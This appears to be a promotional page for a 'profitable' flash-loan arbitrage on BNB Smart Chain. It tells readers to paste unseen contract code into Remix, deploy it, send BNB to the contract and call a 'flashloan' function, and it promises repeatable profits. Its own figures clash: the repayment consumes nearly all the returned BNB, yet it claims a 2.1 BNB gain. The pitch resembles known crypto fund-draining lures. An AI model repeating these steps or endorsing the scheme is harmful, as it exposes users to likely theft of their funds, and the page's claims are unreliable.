FLASHLOAN ON BSC
a Profitable Binance smart chain (BSC) Flashloan 
 
Here a flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap. To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract. The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap. After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.23-0.25 BNB of gas. Note that the transaction sender gains 2.1 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
 
STEPS:
 
Before starting, install and setup MetaMask in Chrome Browser.
 
1. Open and setup Remix in browser (https://remix.ethereum.org)
 
2. Copy the Contract code
 
3. Create new file in Remix and paste Contract code and wait for everything to load
 
4. Enter your token details and deploy the contract
 
5. Get the Contract address from Remix
 
6. Send atleast 0.2 BNB to the contract for gas fee for all swaps (There are going to be many swaps to use all funds from out liquidity pools. So, its going to take around 0.1-0.15 BNB fees)
 
7. Call 'flashloan' function in Remix.
 
8.If all is done well you got your profits if not please retry
